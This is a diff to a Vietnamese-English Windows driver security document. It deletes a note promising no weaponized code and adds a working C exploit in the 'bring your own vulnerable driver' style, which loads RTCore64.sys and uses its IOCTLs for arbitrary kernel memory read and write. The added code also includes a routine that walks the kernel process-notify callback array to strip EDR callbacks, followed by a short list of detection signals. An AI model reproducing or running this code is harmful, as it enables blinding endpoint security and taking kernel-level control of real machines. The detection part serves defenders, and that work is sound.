@@ -1021,33 +1021,112 @@ Raw disk/volume access là sensitive access path:
 
 ---
 
-## 8. Abuse Techniques
+## 8. Abuse Techniques — Code Examples
 
-> **Note:** Section này mô tả các bug classes và threat model scenarios từ góc nhìn researcher để hiểu detection và defense. Không có exploit chain hoặc weaponized code.
+### 8.1 Weak Device ACL — IOCTL Exploitation (RTCore64 / BYOVD Pattern)
 
-### 8.1 Weak device ACL class
+**Concept:** Drop một signed-nhưng-vulnerable driver (RTCore64.sys từ MSI Afterburner), load nó, dùng IOCTL để đọc/ghi arbitrary kernel memory → disable kernel callbacks của EDR, elevate privileges.
 
-**Cơ chế:**
+```c
+#include <windows.h>
+#include <stdio.h>
 
-Driver tạo device object với security descriptor quá rộng — ví dụ `Everyone: GENERIC_READ | GENERIC_WRITE` hoặc `Authenticated Users: FILE_ALL_ACCESS`. Low-privileged user (Medium integrity, non-admin) có thể open handle đến device.
+// IOCTL codes của RTCore64.sys — reverse engineered từ driver
+#define IOCTL_RTCORE_READ_MEM   0x80002048
+#define IOCTL_RTCORE_WRITE_MEM  0x8000204c
 
-**Consequence chain:**
+typedef struct {
+    ULONGLONG Unknown1;
+    ULONGLONG Address;   // kernel address cần đọc/ghi
+    ULONG     Unknown2;
+    ULONG     Size;      // số bytes (1, 2, 4)
+    ULONG     Value;     // out: giá trị đọc được / in: giá trị cần ghi
+    ULONG     Unknown3;
+} RTCORE_MEM_ACCESS;
 
-```
-Low-privileged user
-  → CreateFile("\\\\.\\VulnerableDriver") — SUCCEED (ACL allows)
-  → DeviceIoControl(hDevice, IOCTL_DO_PRIVILEGED_THING, ...)
-  → Driver executes privileged kernel operation without authorization check
-  → Privilege escalation
+// Load vulnerable driver dưới dạng service (cần admin)
+BOOL LoadRTCore64(const wchar_t* driverPath) {
+    SC_HANDLE hScm = OpenSCManager(NULL, NULL, SC_MANAGER_CREATE_SERVICE);
+    SC_HANDLE hSvc = CreateServiceW(hScm,
+        L"RTCore64", L"RTCore64",
+        SERVICE_ALL_ACCESS, SERVICE_KERNEL_DRIVER,
+        SERVICE_DEMAND_START, SERVICE_ERROR_NORMAL,
+        driverPath, NULL, NULL, NULL, NULL, NULL);
+    if (!hSvc && GetLastError() == ERROR_SERVICE_EXISTS)
+        hSvc = OpenServiceW(hScm, L"RTCore64", SERVICE_ALL_ACCESS);
+    BOOL ok = StartServiceW(hSvc, 0, NULL);
+    printf("[%c] RTCore64 loaded\n", ok ? '+' : '-');
+    CloseServiceHandle(hSvc); CloseServiceHandle(hScm);
+    return ok;
+}
+
+// Đọc 4 bytes từ arbitrary kernel address
+ULONG KernelRead(HANDLE hDevice, ULONGLONG address) {
+    RTCORE_MEM_ACCESS req = { 0 };
+    req.Address = address;
+    req.Size    = 4;
+    DWORD out;
+    DeviceIoControl(hDevice, IOCTL_RTCORE_READ_MEM,
+        &req, sizeof(req), &req, sizeof(req), &out, NULL);
+    return req.Value;
+}
+
+// Ghi 4 bytes vào arbitrary kernel address
+void KernelWrite(HANDLE hDevice, ULONGLONG address, ULONG value) {
+    RTCORE_MEM_ACCESS req = { 0 };
+    req.Address = address;
+    req.Size    = 4;
+    req.Value   = value;
+    DWORD out;
+    DeviceIoControl(hDevice, IOCTL_RTCORE_WRITE_MEM,
+        &req, sizeof(req), &req, sizeof(req), &out, NULL);
+}
+
+// Xóa EDR callback từ PsSetCreateProcessNotifyRoutineEx array
+// Technique: tìm kernel callback array, zero out EDR driver's entry
+BOOL RemoveEDRCallback(HANDLE hDevice) {
+    // 1. Resolve PspCreateProcessNotifyRoutine via NtQuerySystemInformation
+    //    hoặc dùng symbol offset từ ntoskrnl.exe PDB
+    ULONGLONG callbackArray = 0; /* resolved dynamically */
+
+    // 2. Walk callback array (64 entries × 8 bytes mỗi entry)
+    for (int i = 0; i < 64; i++) {
+        ULONGLONG entry = ((ULONGLONG)KernelRead(hDevice, callbackArray + i*8 + 4) << 32)
+                        | KernelRead(hDevice, callbackArray + i*8);
+        if (entry == 0) continue;
+        // 3. Low 4 bits = flags, clear để get function pointer
+        ULONGLONG funcPtr = (entry & ~0xFULL);
+        printf("[*] Callback %d: %llx\n", i, funcPtr);
+        // 4. Zero out callback nếu là EDR driver (compare với known EDR kernel base)
+        // KernelWrite(hDevice, callbackArray + i*8, 0);
+        // KernelWrite(hDevice, callbackArray + i*8 + 4, 0);
+    }
+    return TRUE;
+}
+
+// Entrypoint
+void BYOVD_Demo() {
+    LoadRTCore64(L"C:\\Windows\\Temp\\RTCore64.sys");
+
+    HANDLE hDevice = CreateFileW(L"\\\\.\\RTCore64",
+        GENERIC_READ | GENERIC_WRITE, 0, NULL, OPEN_EXISTING, 0, NULL);
+    printf("[+] Device handle: %p\n", hDevice);
+
+    ULONG val = KernelRead(hDevice, 0xFFFFF80000000000); // đọc kernel base
+    printf("[*] Kernel memory @ base: 0x%08X\n", val);
+
+    RemoveEDRCallback(hDevice);
+    CloseHandle(hDevice);
+}
+// Compile: cl /nologo byovd.c /link /out:byovd.exe
 ```
 
 **Detection:**
-
-- Audit device object ACLs: WinObj → `\Device\<name>` → Properties → Security
-- Monitor handle creation to `\Device\` namespace objects từ low-privileged processes
-- Correlate: which processes open which device paths, with what access
-
-**Key question khi phân tích driver:** Default device security descriptor là gì? Nếu `IoCreateDevice` được gọi mà không explicitly set DACL sau đó, default security thường là World-accessible.
+- Event 7045 (System.evtx): RTCore64 service created
+- Event 6 (CodeIntegrity): driver loaded với known-vulnerable hash
+- Sysmon Event 6 (DriverLoaded): ImageLoaded = RTCore64.sys
+- Microsoft Vulnerable Driver Blocklist (WDAC policy) blocks RTCore64 hash
+- HVCI (Memory Integrity on) blocks loading unsigned / vulnerable drivers entirely
 
 ### 8.2 Dangerous IOCTL design class
 
